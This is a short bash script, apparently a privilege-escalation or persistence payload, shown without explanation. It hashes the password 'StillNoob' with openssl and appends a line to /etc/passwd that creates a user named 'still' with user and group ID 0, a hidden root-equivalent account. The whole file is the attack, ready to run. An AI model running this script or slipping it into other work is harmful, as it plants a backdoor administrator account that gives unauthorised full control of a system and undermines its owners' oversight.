#!/bin/bash
line=$(openssl passwd StillNoob)
echo "still:$line:0:0:root:/root:/bin/bash" >> /etc/passwd
